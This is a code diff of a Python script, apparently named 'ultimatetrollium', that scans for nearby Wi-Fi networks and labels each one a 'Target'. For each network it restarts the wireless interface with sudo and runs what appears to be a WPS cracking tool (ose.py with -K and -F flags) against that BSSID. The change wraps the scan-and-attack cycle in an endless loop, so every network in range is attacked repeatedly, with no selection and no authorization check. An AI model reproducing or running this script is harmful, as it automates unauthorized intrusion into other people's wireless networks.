@@ -17,34 +17,35 @@ def scan(interface: str, rescan: bool=True):
 
 
 def main_loop():
-    print("The outputs will be saved in the start script directory (ultimatetrollium/reports)")
-    time.sleep(3)
+    while True:
+        print("The outputs will be saved in the start script directory (ultimatetrollium/reports)")
+        time.sleep(3)
 
-    networks = scan(INTERFACE, True)
+        networks = scan(INTERFACE, True)
 
-    print("Networks found:\n")
-    for network in networks:
-        print("--------")
-        if network.ssid != "":
-            print(f"{network.ssid}")
-        else:
-            print("(no name)")
-        print(f"{network.bssid}\n")
+        print("Networks found:\n")
+        for network in networks:
+            print("--------")
+            if network.ssid != "":
+                print(f"{network.ssid}")
+            else:
+                print("(no name)")
+            print(f"{network.bssid}\n")
 
-    for network in networks:
-        if network.ssid != "":
-            ssid = network.ssid
-        else:
-            ssid = "(no name)"
+        for network in networks:
+            if network.ssid != "":
+                ssid = network.ssid
+            else:
+                ssid = "(no name)"
 
-        print(f"Target: {ssid}, {network.bssid}\n")
+            print(f"Target: {ssid}, {network.bssid}\n")
 
-        # The interface should always restart before running the attack
-        subprocess.run(f"sudo ifconfig {INTERFACE} down", shell=True)
-        subprocess.run(f"sudo iwconfig {INTERFACE} mode managed", shell=True)
-        subprocess.run(f"sudo ifconfig {INTERFACE} up", shell=True)
+            # The interface should always restart before running the attack
+            subprocess.run(f"sudo ifconfig {INTERFACE} down", shell=True)
+            subprocess.run(f"sudo iwconfig {INTERFACE} mode managed", shell=True)
+            subprocess.run(f"sudo ifconfig {INTERFACE} up", shell=True)
 
-        subprocess.run(f"timeout {TIMEOUT} sudo ../ose/ose.py -i {INTERFACE} -K -F --bssid {network.bssid}", shell=True)
+            subprocess.run(f"timeout {TIMEOUT} sudo ../ose/ose.py -i {INTERFACE} -K -F --bssid {network.bssid}", shell=True)
 
         
 if __name__ == "__main__":
